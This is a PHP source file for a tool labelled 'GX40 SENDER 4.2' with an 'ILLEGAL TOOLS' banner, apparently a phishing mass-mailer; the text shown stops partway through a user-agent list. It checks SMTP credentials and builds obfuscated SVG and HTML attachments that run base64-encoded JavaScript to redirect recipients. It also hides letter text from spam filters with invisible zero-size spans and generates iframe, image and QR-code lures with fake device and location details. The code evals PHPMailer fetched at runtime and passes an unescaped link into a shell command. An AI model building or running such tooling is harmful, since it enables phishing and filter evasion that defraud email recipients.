<?php
error_reporting(0);
ini_set('display_errors', '0');
//10 JANUARY 2025
// Define color codes for output
$TEXT_WARNING = "\033[38;2;246;185;59m";
$TEXT_BRAND = "\033[38;2;30;144;255m";
$TEXT_DESIGN_X = "\033[38;2;162;155;254m";
$TEXT_DESIGN_O = "\033[38;2;253;121;168m";
$TEXT_VALID = "\033[38;2;33;140;116m";
$TEXT_NOT_VALID = "\033[38;2;183;21;64m";
$TEXT_LIMIT = "\033[38;2;246;185;59m";
$TEXT_TELEGRAM = "\033[38;2;253;121;168m";
$TEXT_LINK = "\033[38;2;162;155;254m";
$TEXT_PURPLE = "\033[38;2;162;155;254m";
$TEXT_RED = "\033[38;2;253;121;168m";
$TEXT_YELLOW = "\033[38;2;246;185;59m";
$TEXT_BLUE = "\033[38;2;30;144;255m";
$TEXT_WHITE = "\033[38;2;255;255;255m";
$TEXT_CLEAR = "\033[0m";

// Print the UI header
echo "\n";
echo "\033[38;2;99;110;114m  ┌───────────────────────────────────────────────────────────────────────────┐\n";
echo "\033[38;2;99;110;114m  │$TEXT_WARNING     !       I   L   L   E   G   A   L       T   O   O   L   S       !     \033[38;2;99;110;114m│\n";
echo "\033[38;2;99;110;114m  ├───┬───┬───┬───┬───┬───┬───────────────────────────┬───┬───┬───┬───┬───┬───┤\n";
echo "\033[38;2;99;110;114m  │$TEXT_DESIGN_X X \033[38;2;99;110;114m│$TEXT_DESIGN_O O \033[38;2;99;110;114m│$TEXT_DESIGN_X X \033[38;2;99;110;114m│$TEXT_DESIGN_O O \033[38;2;99;110;114m│$TEXT_DESIGN_X X \033[38;2;99;110;114m│$TEXT_DESIGN_O O \033[38;2;99;110;114m│$TEXT_CLEAR$TEXT_WHITE  ┳┓┳┳┳┳┓┏┓┏┓┓┏┏┓ ┏┓┏┓┳┳┓\033[38;2;99;110;114m  │$TEXT_DESIGN_O O \033[38;2;99;110;114m│$TEXT_DESIGN_X X \033[38;2;99;110;114m│$TEXT_DESIGN_O O \033[38;2;99;110;114m│$TEXT_DESIGN_X X \033[38;2;99;110;114m│$TEXT_DESIGN_O O \033[38;2;99;110;114m│$TEXT_DESIGN_X X \033[38;2;99;110;114m│\n";
echo "\033[38;2;99;110;114m  ├───┼───┼───┼───┼───┼───┤$TEXT_CLEAR$TEXT_WHITE  ┃┃┃┃┃┃┃┃┃┃ ┃┃┃  ┃ ┃┃┃┃┃\033[38;2;99;110;114m  ├───┼───┼───┼───┼───┼───┤\n";
echo "\033[38;2;99;110;114m  │$TEXT_DESIGN_O O \033[38;2;99;110;114m│$TEXT_DESIGN_X X \033[38;2;99;110;114m│$TEXT_DESIGN_O O \033[38;2;99;110;114m│$TEXT_DESIGN_X X \033[38;2;99;110;114m│$TEXT_DESIGN_O O \033[38;2;99;110;114m│$TEXT_DESIGN_X X \033[38;2;99;110;114m│$TEXT_CLEAR$TEXT_WHITE  ┃┃┃┃┃┃┃┃┃┗┓┗┫┗┓ ┃ ┃┃┃┃┃\033[38;2;99;110;114m  │$TEXT_DESIGN_X X \033[38;2;99;110;114m│$TEXT_DESIGN_O O \033[38;2;99;110;114m│$TEXT_DESIGN_X X \033[38;2;99;110;114m│$TEXT_DESIGN_O O \033[38;2;99;110;114m│$TEXT_DESIGN_X X \033[38;2;99;110;114m│$TEXT_DESIGN_O O \033[38;2;99;110;114m│\n";
echo "\033[38;2;99;110;114m  ├───┼───┼───┼───┼───┼───┤$TEXT_CLEAR$TEXT_WHITE  ┃┃┃┃┃┃┃┃┃ ┃ ┃ ┃ ┃ ┃┃┃┃┃\033[38;2;99;110;114m  ├───┼───┼───┼───┼───┼───┤\n";
echo "\033[38;2;99;110;114m  │$TEXT_DESIGN_X X \033[38;2;99;110;114m│$TEXT_DESIGN_O O \033[38;2;99;110;114m│$TEXT_DESIGN_X X \033[38;2;99;110;114m│$TEXT_DESIGN_O O \033[38;2;99;110;114m│$TEXT_DESIGN_X X \033[38;2;99;110;114m│$TEXT_DESIGN_O O \033[38;2;99;110;114m│$TEXT_CLEAR$TEXT_WHITE  ┻┛┗┛┛ ┗┣┛┗┛┗┛┗┛•┗┛┗┛┛ ┗\033[38;2;99;110;114m  │$TEXT_DESIGN_O O \033[38;2;99;110;114m│$TEXT_DESIGN_X X \033[38;2;99;110;114m│$TEXT_DESIGN_O O \033[38;2;99;110;114m│$TEXT_DESIGN_X X \033[38;2;99;110;114m│$TEXT_DESIGN_O O \033[38;2;99;110;114m│$TEXT_DESIGN_X X \033[38;2;99;110;114m│\n";
echo "\033[38;2;99;110;114m  ├───┴───┴───┴───┴───┴───┴───────────────────────────┴───┴───┴───┴───┴───┴───┤\n";
echo "\033[38;2;99;110;114m  │$TEXT_BLUE        G X 4 0   S E N D E R  4 . 2 - D U M P S Y S  V E R S I O N        \033[38;2;99;110;114m│\n";
echo "\033[38;2;99;110;114m  ├───────────────────────────────────────────────────────────────────────────┤\n";

function checkJsonFile($filePath)
{
    $jsonContent = file_get_contents($filePath);
    $decodedJson = json_decode($jsonContent, true);
    $jsonError = json_last_error();

    if ($jsonError !== JSON_ERROR_NONE) {
        if ($filePath === '1-GX40-SENDER/CONFIG.json') {
            echo "\033[38;2;99;110;114m  │\033[0m Please check your setting '\033[38;2;253;121;168mCONFIG.json\033[0m'.                                  \033[38;2;99;110;114m│\033[0m\n";
        } elseif ($filePath === '1-GX40-SENDER/SMTP.json') {
            echo "\033[38;2;99;110;114m  │\033[0m Please check your setting '\033[38;2;253;121;168mSMTP.json\033[0m'.                                    \033[38;2;99;110;114m│\033[0m\n";
        }
    }
}

function write($file, $text)
{
    $fp = fopen($file, 'a');
    fwrite($fp, $text);
    fclose($fp);
}

function json_get_error_line($jsonContent)
{
    $lines = explode("\n", $jsonContent);
    $lineNumber = 1;

    foreach ($lines as $line) {
        $partialJson = implode("\n", array_slice($lines, 0, $lineNumber + 1));
        $decodedJson = json_decode($partialJson, true);
        $jsonError = json_last_error();

        if ($jsonError !== JSON_ERROR_NONE) {
            return $lineNumber + 1;
        }

        $lineNumber++;
    }

    return 0;
}

function checkJsonFiles($filePaths)
{
    $hasError = false;

    foreach ($filePaths as $filePath) {
        if (file_exists($filePath)) {
            checkJsonFile($filePath);
            if (json_last_error() !== JSON_ERROR_NONE) {
                $hasError = true;
            }
        } else {
            echo "File JSON '$filePath' tidak ditemukan.\n";
        }
    }

    if ($hasError) {
        echo "\033[38;2;99;110;114m  ├───────────────────────────────────────────────────────────────────────────┤\n";
        echo "\033[38;2;99;110;114m  │\033[0m Please use \033[38;2;162;155;254mhttps://code.visualstudio.com/\033[0m easier to find errors.          \033[38;2;99;110;114m│\033[0m\n";
        echo "\033[38;2;99;110;114m  └───────────────────────────────────────────────────────────────────────────┘\033[0m\n";
        echo "\n";
        exit();
    }
}

$jsonFiles = [
    '1-GX40-SENDER/CONFIG.json',
    '1-GX40-SENDER/SMTP.json'
];

checkJsonFiles($jsonFiles);

$mailerUrl = 'https://raw.githubusercontent.com/PHPMailer/PHPMailer/master/src/PHPMailer.php';
$exceptionUrl = 'https://raw.githubusercontent.com/PHPMailer/PHPMailer/master/src/Exception.php';
$smtpUrl = 'https://raw.githubusercontent.com/PHPMailer/PHPMailer/master/src/SMTP.php';

eval('?>' . file_get_contents($exceptionUrl));
eval('?>' . file_get_contents($smtpUrl));
eval('?>' . file_get_contents($mailerUrl));


echo "\033[38;2;99;110;114m  │\033[38;2;246;185;59m CHECKING SMTP FIRST                                                       \033[38;2;99;110;114m│\n";
echo "\033[38;2;99;110;114m  ├──────────┬────────────────────┬──────┬────────────────────────────┬───────┤\n";
echo "\033[38;2;99;110;114m  │\033[0m TIME     \033[38;2;99;110;114m│\033[0m HOST               \033[38;2;99;110;114m│\033[0m PORT \033[38;2;99;110;114m│\033[0m USERNAME                   \033[38;2;99;110;114m│\033[0m STATS \033[38;2;99;110;114m│\n";
echo "\033[38;2;99;110;114m  ├──────────┼────────────────────┼──────┼────────────────────────────┼───────┤\n";

function test_smtp($smtpConfig, $recipientEmail)
{
    $mail = new PHPMailer\PHPMailer\PHPMailer(true);
    try {
        $time = date('H:i:s');
        $mail->isSMTP();
        $mail->Host = $smtpConfig['server'];
        $mail->SMTPAuth = true;
        $mail->Username = $smtpConfig['username'];
        $mail->Password = $smtpConfig['password'];
        $mail->SMTPSecure = $smtpConfig['secure'] === 'TLS' ? PHPMailer\PHPMailer\PHPMailer::ENCRYPTION_STARTTLS : PHPMailer\PHPMailer\PHPMailer::ENCRYPTION_SMTPS;
        $mail->Port = $smtpConfig['port'];
        $mail->setFrom($smtpConfig['username'], 'WWW.DUMPSYS.COM');
        $mail->addAddress($recipientEmail);
        $mail->Subject = 'Your SMTP Working !';
        $mail->isHTML(true);
        $mail->Body = 'Just ignore this message is not very useful for you to read';
        $mail->send();

        $server = strlen($smtpConfig['server']) < 18 ? str_pad(substr($smtpConfig['server'], 0, 18), 18) : substr($smtpConfig['server'], 0, 18);
        $port = strlen($smtpConfig['port']) < 4 ? str_pad($smtpConfig['port'], 4) : substr($smtpConfig['port'], 0, 4);
        $username = strlen($smtpConfig['username']) < 26 ? str_pad(substr($smtpConfig['username'], 0, 26), 26) : substr($smtpConfig['username'], 0, 26);

        echo "  \033[38;2;99;110;114m│\033[38;2;33;140;116m $time \033[38;2;99;110;114m│\033[38;2;33;140;116m $server \033[38;2;99;110;114m│\033[38;2;33;140;116m $port \033[38;2;99;110;114m│\033[38;2;33;140;116m $username \033[38;2;99;110;114m│\033[38;2;33;140;116m WORK  \033[38;2;99;110;114m│\n";
    } catch (Exception $e) {
        $server = strlen($smtpConfig['server']) < 18 ? str_pad(substr($smtpConfig['server'], 0, 18), 18) : substr($smtpConfig['server'], 0, 18);
        $port = strlen($smtpConfig['port']) < 4 ? str_pad($smtpConfig['port'], 4) : substr($smtpConfig['port'], 0, 4);
        $username = strlen($smtpConfig['username']) < 26 ? str_pad(substr($smtpConfig['username'], 0, 26), 26) : substr($smtpConfig['username'], 0, 26);

        echo "  \033[38;2;99;110;114m│\033[38;2;183;21;64m $time \033[38;2;99;110;114m│\033[38;2;183;21;64m $server \033[38;2;99;110;114m│\033[38;2;183;21;64m $port \033[38;2;99;110;114m│\033[38;2;183;21;64m $username \033[38;2;99;110;114m│\033[38;2;183;21;64m FAIL  \033[38;2;99;110;114m│\n";
    }
}

$config = config();
$smtpConfigs = json_decode(file_get_contents('1-GX40-SENDER/SMTP.json'), true);
$smtpEmailTest = $config[0]['smtp_email_test'] ?? 'Use_Your_Email_Fucking@dumpsys.com';

foreach ($smtpConfigs as $smtpConfig) {
    test_smtp($smtpConfig, $smtpEmailTest);
}

function generate_random_string($length)
{
    return substr(str_shuffle(str_repeat('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length / 52))), 0, $length);
}

function generate_random_ip()
{
    return long2ip(rand(0, 255) << 24 | rand(0, 255) << 16 | rand(0, 255) << 8 | rand(0, 255));
}

function generate_random_number($length)
{
    return substr(str_shuffle(str_repeat('0123456789', ceil($length / 10))), 0, $length);
}

function generate_random_chars($length)
{
    return substr(str_shuffle(str_repeat('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', ceil($length / 62))), 0, $length);
}

function encrypt_svg($svg_link)
{
    $parsing_link = parse_url($svg_link);
    $filter_link = (isset($parsing_link['scheme'])) ? $svg_link : "http://$svg_link";
    $js_code = "setTimeout(function() { window.location.href = '$filter_link'; }, 0);";
    $encoded_js = base64_encode($js_code);
    $random_suffix = generate_random_string(150);
    $encrypted_js_code = "function DumpSys_{$random_suffix}() { eval(atob('{$encoded_js}')); } DumpSys_{$random_suffix}();";

    $dummy_functions = str_repeat("function DumpSys_" . generate_random_string(150) . "() { /* Dummy function */ }\n", 5);
    return '<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg width="200" height="200" xmlns="http://www.w3.org/2000/svg">
  <script type="text/javascript">
    <![CDATA[
      ' . $dummy_functions . $encrypted_js_code . '
    ]]>
  </script>
</svg>';
}

function encrypt_html($html_snippets)
{
    $js_functions = [];

    foreach ($html_snippets as $html) {
        $encoded_html = base64_encode($html);
        $random_suffix = generate_random_string(150);
        $js_code = (
            "function DumpSys_{$random_suffix}() {" .
            "var decoded = atob('{$encoded_html}');" .
            "document.write(decoded);" .
            "}" .
            "DumpSys_{$random_suffix}();"
        );

        $js_functions[] = $js_code;
    }

    $dummy_functions = '';
    for ($i = 0; $i < 5; $i++) {
        $dummy_suffix = generate_random_string(150);
        $nested_suffix = generate_random_string(250);
        $dummy_functions .= "function DumpSys_{$dummy_suffix}() { " .
            "function DumpSys_{$nested_suffix}(){/*https://t.me/DumpSysOfficial*/}" .
            "DumpSys_{$nested_suffix}();/*https://t.me/DumpSysOfficial*/" .
            "}\n";
    }

    $combined_js = implode('', $js_functions) . $dummy_functions;

    $html_code = (
        "<html><head></head><body>" .
        "<script type='text/javascript'>{$combined_js}</script>" .
        "<noscript><i>What do you want to know? Contact me at https://t.me/DumpSysOfficial :)</i></noscript>" .
        "</body></html>"
    );

    return $html_code;
}

function encrypt($inner_text)
{
    $encrypted_text = "";
    $char_count = 1;
    $length = strlen($inner_text);
    for ($i = 0; $i < $length; $i++) {
        $char = $inner_text[$i];

        if (ctype_alpha($char) && !preg_match('/##.*##/', $inner_text) && $char !== ':' && !preg_match('/&[a-zA-Z]+;/', $char)) {
            $encrypted_text .= $char . "<span style='font-size:0px'>##CHAR" . $char_count . "##</span>";
            $char_count++;
        } else {
            $encrypted_text .= $char;
        }
    }
    return $encrypted_text;
}

function encrypt_text_except_styles_and_head($html_content)
{


    preg_match_all('/<style.*?>(.*?)<\/style>/is', $html_content, $style_contents);
    preg_match_all('/<head.*?>(.*?)<\/head>/is', $html_content, $head_contents);

    $html_content = preg_replace('/<style.*?>(.*?)<\/style>/is', "<STYLE_PLACEHOLDER>", $html_content);
    $html_content = preg_replace('/<head.*?>(.*?)<\/head>/is', "<HEAD_PLACEHOLDER>", $html_content);

    $html_content = preg_replace_callback('/>([^<]+)</', function ($matches) {
        return ">" . encrypt($matches[1]) . "<";
    }, $html_content);

    $html_content = str_replace("<STYLE_PLACEHOLDER>", "<style>" . implode("", $style_contents[1]) . "</style>", $html_content);
    $html_content = str_replace("<HEAD_PLACEHOLDER>", "<head>" . implode("", $head_contents[1]) . "</head>", $html_content);

    return $html_content;
}

function getLetterContent($letterFile)
{
    return file_exists($letterFile) ? file_get_contents($letterFile) : '';
}

function create_iframe_html($attachment_link, $use_cloudflare)
{
    $iframe_src = $use_cloudflare == "1" ? "https://cloudflare.dumpsys.com/index.php?domain={$attachment_link}" : "https://cloudflare.dumpsys.com/redirect.php?domain={$attachment_link}";

    $html_content = '<!DOCTYPE html>
    <html lang="id">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Wait a moment...</title>
        <style>
            html, body { margin: 0; padding: 0; height: 100%; overflow: hidden; }
            iframe { width: 100%; height: 100%; border: none; }
        </style>
    </head>
    <body>
        <iframe src="' . $iframe_src . '" title="wait a moment..."></iframe>
    </body>
    </html>';

    return encrypt_html([$html_content]);
}

function convertHtmlToJpg($letter)
{

    $rand = rand();
    $htmlPath = "1-GX40-SENDER/.temp/.attachment_html_to_img/.html_temp/temp_html_{$rand}.html";
    $outputPath = "1-GX40-SENDER/.temp/.attachment_html_to_img/.html_temp/$rand.jpg";

    $options = [
        'quality' => 90, // Kualitas gambar
        'enable-local-file-access' => true // Akses file lokal
    ];

    if (!is_dir(dirname($htmlPath))) {
        mkdir(dirname($htmlPath), 0777, true);
    }

    //create to file
    file_put_contents($htmlPath, $letter);

    // Validasi file input
    if (!file_exists($htmlPath)) {
        exit("File HTML Not found");
    }

    // Siapkan opsi tambahan
    $additionalOptions = '';
    if (!empty($options)) {
        foreach ($options as $key => $value) {
            $additionalOptions .= " --$key " . escapeshellarg($value);
        }
    }


    $command = "/usr/bin/wkhtmltoimage $additionalOptions " . escapeshellarg($htmlPath) . " " . escapeshellarg($outputPath) . " > /dev/null 2>&1";
    exec($command, $output, $returnVar);

    // Cek hasil konversi
    if ($returnVar !== 0) {
        exit("Failed to convert HTML to JPG");
    }

    if (file_exists($outputPath)) {
        $mimeType = mime_content_type($outputPath);
        $base64String = 'data:' . $mimeType . ';base64,' . convertToBase64($outputPath);
    }


    $html_con = "<!DOCTYPE html><html><body><a href='##LINK##' ><img src='$base64String'></a></body></html>";

    unlink($htmlPath);
    unlink($outputPath);

    return $html_con;
}

function config()
{
    return json_decode(file_get_contents('1-GX40-SENDER/CONFIG.json'), true);
}

function censor_email($email)
{
    $parts = explode('@', $email);
    return count($parts) == 2 ? substr($parts[0], 0, 3) . str_repeat('*', strlen($parts[0]) - 3) . '@' . $parts[1] : $email;
}

function generateQRCode($qrLink, $qrSize)
{
    $qrDir = '1-GX40-SENDER/.temp/.qr';

    if (!is_dir($qrDir)) {
        mkdir($qrDir, 0777, true);
    }

    $pngFile = $qrDir . '/qr_' . uniqid() . '.png';
    $qrSizeValue = intval($qrSize);

    $command = "qrencode -t PNG -s $qrSizeValue -o $pngFile '$qrLink'";
    exec($command, $output, $returnVar);

    if ($returnVar !== 0) {
        error_log("Failed to generate QR code: " . implode("\n", $output));
        return null;
    }

    return $pngFile;
}

function convertToBase64($filePath)
{
    return base64_encode(file_get_contents($filePath));
}

function embedQRCode($qrLink, $qrSize, $qrTitle)
{
    $qrImagePath = generateQRCode($qrLink, $qrSize);

    if ($qrImagePath === null || !file_exists($qrImagePath)) {
        return "<p>Error generating QR code.</p>";
    }

    $base64Png = convertToBase64($qrImagePath);

    if (file_exists($qrImagePath)) {
        unlink($qrImagePath);
    }

    return "<img src='data:image/png;base64,$base64Png' alt='$qrTitle' />";
}

function LetterEncode($letter_encrypt, $letter_filename, $letter_contents, $recipient_email, $subject_template, $smtpConfig, $fromName)
{
    $config = config();
    $domains = isset($config[0]['Domains']) ? array_column($config[0]['Domains'], 'Domain') : ['https://defaultdomain.com'];
    $random_domain = $domains[array_rand($domains)];

    $letter_contents = str_replace('##LINK##', $random_domain, $letter_contents);
    $subject_template = str_replace('##LINK##', $random_domain, $subject_template);

    $apple_phones = ["iPhone 5", "iPhone 5C", "iPhone 5S", "iPhone 6", "iPhone 6 Plus", "iPhone 6S", "iPhone 6S Plus", "iPhone SE (1st generation)", "iPhone 7", "iPhone 7 Plus", "iPhone 8", "iPhone 8 Plus", "iPhone X", "iPhone XS", "iPhone XS Max", "iPhone XR", "iPhone 11", "iPhone 11 Pro", "iPhone 11 Pro Max", "iPhone SE (2nd generation)", "iPhone 12", "iPhone 12 Mini", "iPhone 12 Pro", "iPhone 12 Pro Max", "iPhone 13", "iPhone 13 Mini", "iPhone 13 Pro", "iPhone 13 Pro Max", "iPhone SE (3rd generation)", "iPhone 14", "iPhone 14 Plus", "iPhone 14 Pro", "iPhone 14 Pro Max", "iPhone 15", "iPhone 15 Plus", "iPhone 15 Pro", "iPhone 15 Pro Max"];
    $random_apple_phone = $apple_phones[array_rand($apple_phones)];

    $apple_apps = ["Minecraft", "Procreate", "Blek", "Heads Up!", "Notability", "GoodNotes 5", "Fantastical", "Carrot Weather", "Affinity Photo", "Pixelmator", "MyFitnessPal", "Duolingo", "Calm", "Headspace", "Pocket Casts", "Trello", "Todoist", "Evernote", "Scanner Pro", "TurboScan", "Sleep Cycle", "White Noise", "Procreate Pocket", "LumaFusion", "Affinity Designer", "PDF Expert", "PCalc", "Dark Sky", "SkySafari", "PlantSnap", "PictureThis", "Procreate Dreams", "Affinity Publisher", "OmniFocus", "Day One", "1Password", "NordVPN", "VPN Unlimited", "KineMaster", "ArtRage", "GarageBand", "Final Cut Pro", "iA Writer", "Scrivener", "MindNode", "Tayasui Sketches", "Zombies, Run!", "The Room", "Stardew Valley", "Civilization VI"];
    $random_apple_app = $apple_apps[array_rand($apple_apps)];

    $apple_macbooks = ["MacBook", "MacBook Air", "MacBook Pro"];
    $random_apple_macbook = $apple_macbooks[array_rand($apple_macbooks)];

    $android_phones = ["Samsung Galaxy S23", "Samsung Galaxy S23+", "Samsung Galaxy S23 Ultra", "Google Pixel 7", "Google Pixel 7 Pro", "OnePlus 11", "OnePlus Nord 2T", "Xiaomi 13", "Xiaomi 13 Pro", "Xiaomi Redmi Note 12", "Oppo Find N2", "Oppo Reno 8", "Vivo X90", "Vivo V25 Pro", "Motorola Edge 40", "Motorola Moto G Power", "Sony Xperia 1 IV", "Sony Xperia 5 IV", "Asus ROG Phone 6", "Asus Zenfone 9", "Realme GT 2 Pro", "Realme 10 Pro+", "Nokia G400", "Nokia X30", "Honor Magic 5 Pro", "Honor 70", "TCL 30 XE", "TCL 40 SE", "ZTE Axon 20", "ZTE Blade V40", "Huawei P50 Pro", "Huawei Mate 50", "Samsung Galaxy A54", "Samsung Galaxy A34", "Google Pixel 6a", "OnePlus 10 Pro", "OnePlus Nord CE 2", "Xiaomi Poco F4", "Xiaomi Poco X4 Pro", "Oppo A78", "Oppo A57", "Vivo Y100", "Vivo Y21", "Motorola Edge 20", "Motorola Moto G Stylus", "Sony Xperia 10 IV", "Asus Zenfone 8", "Realme Narzo 50", "Nokia G50", "Honor X40 GT"];
    $random_android_phone = $android_phones[array_rand($android_phones)];

    $android_os = ["Android 1.0", "Android 1.1", "Android 1.5", "Android 1.6", "Android 2.0", "Android 2.2", "Android 2.3", "Android 3.0", "Android 4.0", "Android 4.1", "Android 4.4", "Android 5.0", "Android 6.0", "Android 7.0", "Android 8.0", "Android 9.0", "Android 10", "Android 11", "Android 12", "Android 13", "Android 14"];
    $random_android_os = $android_os[array_rand($android_os)];

    $country_states = ["Abu Dhabi, United Arab Emirates", "Accra, Ghana", "Algiers, Algeria", "Ankara, Turkey", "Asunción, Paraguay", "Athens, Greece", "Baghdad, Iraq", "Baku, Azerbaijan", "Bangkok, Thailand", "Banjul, Gambia", "Beijing, China", "Belgrade, Serbia", "Berlin, Germany", "Bern, Switzerland", "Bishkek, Kyrgyzstan", "Bogotá, Colombia", "Bratislava, Slovakia", "Brazzaville, Republic of Congo", "Brussels, Belgium", "Bucharest, Romania", "Budapest, Hungary", "Cairo, Egypt", "Canberra, Australia", "Cape Town, South Africa", "Caracas, Venezuela", "Chisinau, Moldova", "Djibouti, Djibouti", "Dodoma, Tanzania", "Doha, Qatar", "Dublin, Ireland", "Dushanbe, Tajikistan", "Hanoi, Vietnam", "Harare, Zimbabwe", "Helsinki, Finland", "Honolulu, United States (Hawaii)", "Islamabad, Pakistan", "Havana, Cuba", "Jakarta, Indonesia", "Jerusalem, Israel", "Kabul, Afghanistan", "Kairo, Egypt", "Kampala, Uganda", "Karachi, Pakistan", "Kashgar, China", "Kigali, Rwanda", "Kuala Lumpur, Malaysia", "Kyiv, Ukraine", "Lisbon, Portugal", "Ljubljana, Slovenia", "Lomé, Togo", "London, United Kingdom", "Luanda, Angola", "Lusaka, Zambia", "Madrid, Spain", "Malabo, Equatorial Guinea", "Managua, Nicaragua", "Manila, Philippines", "Minsk, Belarus", "Mogadishu, Somalia", "Monrovia, Liberia", "Montevideo, Uruguay", "Moroni, Comoros", "Moscow, Russia", "Nairobi, Kenya", "Nassau, Bahamas", "N'Djamena, Chad", "Ngerulmud, Palau", "Niamey, Niger", "Nicosia, Cyprus", "Oslo, Norway", "Ottawa, Canada", "Ouagadougou, Burkina Faso", "Peking, China (Beijing)", "Podgorica, Montenegro", "Port Moresby, Papua New Guinea", "Port-au-Prince, Haiti", "Prague, Czech Republic", "Quito, Ecuador", "Riga, Latvia", "Rome, Italy", "Riyadh, Saudi Arabia", "San Salvador, El Salvador", "Sofia, Bulgaria", "Stockholm, Sweden", "Suva, Fiji", "Tbilisi, Georgia", "Tegucigalpa, Honduras", "Tehran, Iran", "Tokyo, Japan", "Tripoli, Libya", "Tunis, Tunisia", "Ulaanbaatar, Mongolia", "Vaduz, Liechtenstein", "Valletta, Malta", "Vienna, Austria", "Vientiane, Laos", "Vilnius, Lithuania", "Washington D.C., United States", "Yamoussoukro, Ivory Coast"];
    $random_country_state = $country_states[array_rand($country_states)];

    $countries = ["United Arab Emirates", "Ghana", "Algeria", "Turkey", "Paraguay", "Greece", "Iraq", "Azerbaijan", "Thailand", "Gambia", "China", "Serbia", "Germany", "Switzerland", "Kyrgyzstan", "Colombia", "Slovakia", "Republic of Congo", "Belgium", "Romania", "Hungary", "Egypt", "Australia", "South Africa", "Venezuela", "Moldova", "Djibouti", "Tanzania", "Qatar", "Ireland", "Tajikistan", "Vietnam", "Zimbabwe", "Finland", "United States (Hawaii)", "Pakistan", "Cuba", "Indonesia", "Israel", "Afghanistan", "Egypt", "Uganda", "Australia", "Pakistan", "China", "Rwanda", "Malaysia", "Ukraine", "Portugal", "Slovenia", "Togo", "United Kingdom", "Angola", "Zambia", "Spain", "Equatorial Guinea", "Nicaragua", "Philippines", "Belarus", "Somalia", "Liberia", "Uruguay", "Comoros", "Russia", "Kenya", "Bahamas", "Chad", "Palau", "Niger", "Cyprus", "Norway", "Canada", "Burkina Faso", "China (Beijing)", "Montenegro", "Papua New Guinea", "Haiti", "Czech Republic", "Ecuador", "Latvia", "Italy", "Saudi Arabia", "El Salvador", "Bulgaria", "Sweden", "Fiji", "Georgia", "Honduras", "Iran", "Japan", "Libya", "Tunisia", "Mongolia", "Liechtenstein", "Malta", "Austria", "Laos", "Lithuania", "United States", "Ivory Coast"];
    $random_country = $countries[array_rand($countries)];

    $user_agents = ["Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9", "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4", "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240", "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0", "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko", "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36", "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko", "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/7.1.8 Safari/537.85.17", "Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4", "Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F69 Safari/600.1.4", "Mozilla/5.0 (Windows NT 6.1; rv:40.0) Gecko/20100101 Firefox/40.0", "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)", "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)", "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko", "Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0", "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.5.17 (KHTML, like Gecko) Version/8.0.5 Safari/600.5.17", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36", "Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko", "Mozilla/5.0 (iPad; CPU OS 7_1_2 like 